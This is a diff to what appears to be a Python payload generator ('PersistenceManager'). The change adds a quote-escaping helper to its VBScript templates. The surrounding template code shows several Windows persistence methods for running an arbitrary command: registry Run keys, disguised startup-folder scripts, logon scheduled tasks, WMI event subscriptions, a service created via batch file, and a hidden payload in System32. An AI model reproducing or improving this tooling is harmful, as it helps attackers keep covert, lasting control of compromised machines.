@@ -9,6 +9,11 @@ import random
 import string
 
 
+def _vbs_escape(s):
+    """Escape double quotes for embedding in VBS string literals"""
+    return s.replace('"', '""')
+
+
 class PersistenceManager:
     """Generate payloads with multiple persistence methods"""
 
@@ -47,7 +52,7 @@ Set shell = CreateObject("WScript.Shell")
 
 ' Persistence via Registry - HKCU (User) or HKLM (System)
 key_name = "{key_name}"
-cmd = "{command}"
+cmd = "{_vbs_escape(command)}"
 
 ' Try user-level persistence first (doesn't require admin)
 On Error Resume Next
@@ -94,7 +99,7 @@ Set ws = CreateObject("WScript.Shell")
 
 ' Get startup folder path (works on all Windows versions)
 startup_path = shell.SpecialFolders("Startup")
-cmd = "{command}"
+cmd = "{_vbs_escape(command)}"
 
 ' Create VBS shortcut in startup folder
 vbs_path = startup_path & "\\~" & Right(Minute(Now()) & Second(Now()), 8) & ".vbs"
@@ -145,7 +150,7 @@ Dim shell, cmd, task_name
 
 Set shell = CreateObject("WScript.Shell")
 
-cmd = "{command}"
+cmd = "{_vbs_escape(command)}"
 task_name = "{task_name}"
 
 ' Create scheduled task that runs on logon
@@ -191,7 +196,7 @@ Dim objBindingClass, objBinding
 Dim strFilterQuery
 Dim cmd
 
-cmd = "{command}"
+cmd = "{_vbs_escape(command)}"
 
 Set objService = GetObject("winmgmts:\\\\.\\root\\subscription")
 
@@ -258,7 +263,7 @@ Dim bat_path, fso
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-cmd = "{command}"
+cmd = "{_vbs_escape(command)}"
 service_name = "{service_name}"
 
 ' Create batch file for service
@@ -302,7 +307,7 @@ Dim base64_encoded
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-cmd = "{command}"
+cmd = "{_vbs_escape(command)}"
 
 ' Store payload in Windows\System32 with system attribute
 payload_path = shell.ExpandEnvironmentStrings("%systemroot%") & "\\System32\\~temp_sys.vbs"
@@ -362,7 +367,7 @@ Dim success_count
 Set shell = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-cmd = "{command}"
+cmd = "{_vbs_escape(command)}"
 task_name = "{task_name}"
 service_name = "{service_name}"
 success_count = 0
